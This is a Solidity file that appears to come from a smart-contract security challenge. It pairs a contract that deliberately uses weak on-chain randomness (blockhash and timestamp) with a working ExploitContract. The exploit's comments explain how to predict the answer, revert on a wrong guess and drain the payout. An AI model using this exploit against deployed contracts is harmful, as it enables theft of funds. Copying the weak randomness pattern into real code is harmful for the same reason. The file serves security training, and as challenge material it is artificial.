// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below:
    //Target contract storage variables are not accessible since they are not marked public.
    uint8 exploitGuess;

    receive() external payable {}

    //Since `settle` has an answer thats derived from % 10, answer will always be 0 - 9 inclusive.
    //Sets `guesser` to this address, and `guess`/`exploitGuess` to `n`, and
    //`settlementBlockNumber` to `block.number + 1`.
    function lockInGuess(uint8 n) public payable {
        require(n < 10);
        exploitGuess = n;
        predictTheFuture.lockInGuess{value: 1 ether}(n);
    }

    //Call this at least after 2 blocks have passed since `lockInGuess` was called.
    //As we are tracking `guess` as `exploitGuess`, `settle` can be indirectly brute-forced to
    //get the correct answer. By replicating the hashing used in `settle` in `attack` here,
    //and comparing the `answer` to `exploitGuess`, we can get to the correct answer eventually
    //so long as we keep calling `attack` with either different block number or timestamp.
    //The `guesser` will be reset to address(0) after `settle` is called, no matter the outcome,
    //so we should revert transaction if `answer` does not match `exploitGuess`, then we dont
    //have to call `lockInGuess` again.
    function attack() public {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == exploitGuess);
        predictTheFuture.settle();
    }
}
